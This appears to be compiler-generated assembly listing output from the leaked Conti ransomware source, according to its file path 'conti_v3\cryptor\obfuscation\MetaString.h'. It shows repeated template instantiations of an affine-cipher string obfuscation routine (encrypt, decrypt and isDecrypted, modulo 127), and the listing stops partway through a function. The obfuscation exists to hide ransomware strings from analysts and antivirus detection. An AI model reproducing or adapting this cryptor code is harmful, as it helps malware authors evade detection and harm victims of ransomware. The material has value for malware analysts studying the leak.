?isDecrypted@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4e 00 00 00	 mov	 ecx, 78			; 0000004eH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4e	 add	 r8d, 78			; 0000004eH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6f	 sub	 eax, 111		; 0000006fH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 04	 sub	 eax, 4
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 04	 add	 r8d, 4
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5d	 sub	 eax, 93			; 0000005dH
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5d	 add	 r8d, 93			; 0000005dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 54 00 00 00	 mov	 ecx, 84			; 00000054H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 3d	 sub	 eax, 61			; 0000003dH
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
